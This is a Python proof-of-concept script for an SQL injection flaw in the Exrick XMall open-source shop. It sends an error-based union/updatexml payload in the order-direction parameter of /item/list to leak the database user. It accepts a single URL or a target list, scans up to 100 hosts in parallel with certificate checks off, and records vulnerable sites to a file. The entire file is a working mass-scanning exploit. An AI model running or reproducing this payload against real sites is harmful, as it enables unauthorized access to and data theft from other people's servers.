import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    banner()
    parser = argparse.ArgumentParser(description = 'Exrick XMall 开源商城 SQL注入漏洞')    
    parser.add_argument('-u','--url',help='please input attack url')        
    parser.add_argument('-f','--file',help='please input attack file')       
    agres = parser.parse_args()                                    
    if agres.url and not agres.file:                       
        poc(agres.url)                             
    elif agres.file and not agres.url:               
        url_list = []                             
        with open (agres.file,'r',encoding='utf-8') as fp:  
            for i in fp.readlines():                        
                url_list.append(i.strip().replace('\n',''))     
        mp = Pool(100)                     
        mp.map(poc, url_list)            
        mp.close()                       
        mp.join()                            
    else: 
        print(f'usag:\n\t python3 {sys.argv[0]} -h')             

def banner():
    text="""

    ______          _      __      _  __ __  ___      ____
   / ____/  _______(_)____/ /__   | |/ //  |/  /___ _/ / /
  / __/ | |/_/ ___/ / ___/ //_/   |   // /|_/ / __ `/ / / 
 / /____>  </ /  / / /__/ ,<     /   |/ /  / / /_/ / / /  
/_____/_/|_/_/  /_/\___/_/|_|   /_/|_/_/  /_/\__,_/_/_/   
                                                          
"""
    print(text)
def poc(target):
    url = target + '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    }
    try:
        result = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if 'message' in result:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]{target} Vulnerability exists'+'\n')
        else:
            print(f'[-]{target} Vulnerability does not exists')
    except:
        print(f'[*]{target} server error')


if __name__ == '__main__':
    main()